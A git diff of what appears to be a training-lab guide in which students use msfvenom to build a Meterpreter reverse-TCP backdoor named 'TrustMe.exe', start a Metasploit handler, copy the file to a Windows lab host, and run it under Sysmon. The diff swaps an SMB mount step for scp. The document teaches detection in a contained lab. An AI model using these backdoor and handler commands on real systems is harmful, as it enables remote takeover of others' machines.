@@ -33,17 +33,8 @@ net user Administrator password1234
 
 Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
-Before we move on from our Powershell window, lets get our IP by running the following command:
 
-<pre>ipconfig</pre>
-
-![](attachments/powershellipconfig.png)
-
-**REMEMBER - YOUR IP WILL BE DIFFERENT**
-
-Write this IP down so we can use it again later.
-
-
+Now we need a **Linux Terminal**
 
 
 - Open **Command Prompt**
@@ -60,27 +51,14 @@ ssh ubuntu@linux.cloudlab.lan
 
 
 
-We need to run the following commands in order to mount our remote system to the correct directory:
+Become root:
 
 ```bash
 sudo su -
 ```
 
-<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>
 
-**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
-
-If you see the following error, it means that the device is already mounted.
-
-![](attachments/mounterror.png)
-
-If this is the case, ignore it.
-
-Run the following command to navigate into the mounted directory:
-
-<pre>cd /mnt/windows-share</pre>
-
-Before we run the next commands, we need to get the IP of our Linux System (AKA our Linux IP Adress). Lets do so by running the following:
+Before we run the next commands, we need to get the **IP** of our **Linux System** (AKA our **Linux IP Adress**). Lets do so by running the following:
 
 ```bash
 ifconfig
@@ -93,10 +71,10 @@ ifconfig
 Run the following commands to start a simple backdoor and backdoor listener: 
 
 ```bash
-msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /home/ubuntu/Desktop/TrustMe.exe
 ```
 
-Let's start the **Metasploit** Handler.  
+Let's start the **Metasploit** Handler. We need another **Linux Terminal**
 
 
 
@@ -113,16 +91,14 @@ ssh ubuntu@linux.cloudlab.lan
 
 
 
-Let's become root.
-
 ```bash
-sudo su -
+cd ~/Desktop
 ```
 
 Now let's start the **Metasploit** Handler
 
 ```bash
-msfconsole -q
+sudo msfconsole -q
 ```
 
 We are going to run the following commands to correctly set the parameters:
@@ -149,13 +125,30 @@ It should look like this:
 
 ![](attachments/msfconsole.png)
 
-We will need to open a **"cmd.exe"** terminal as **Administrator**.
 
-![](attachments/OpeningWindowsCommandPrompt.png)
+Going back to our **Powershell** terminal, copy the file over from **Linux**
 
-<pre>cd \IntroLabs</pre>
+```ps
+cd .\Desktop\
+```
 
-<pre>Sysmon64.exe -accepteula -i sysmonconfig-export.xml</pre>
+```ps
+scp ubuntu@linux.cloudlab.lan:/home/ubuntu/Desktop/TrustMe.exe .
+```
+
+
+Now we will need to open a **"cmd.exe"** terminal as **Administrator**.
+
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/e8526cf1-0ed9-48f6-bd3f-f56af7536463" />
+
+
+```cmd
+cd \IntroLabs
+```
+
+```cmd
+Sysmon64.exe -accepteula -i sysmonconfig-export.xml
+```
 
 It should look like this:
 
@@ -163,13 +156,17 @@ It should look like this:
 
 let's run the following commands to run the **"TrustMe.exe"** file.
 
-<pre>cd \</pre>
+```cmd
+cd \Users\Administrator\Desktop
+```
  
 Then run it with the following:
 
- <pre>TrustMe.exe</pre>
+```cmd
+TrustMe.exe
+```
 
-Back at your Linux terminal, you should have a metasploit session!
+Back at your **Linux terminal**, you should have a metasploit session!
 
 ![](attachments/meterpretersession.png)
 
@@ -211,6 +208,7 @@ Please be sure to destroy the lab environment!
 [Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
 
 ---
+
 
 
 
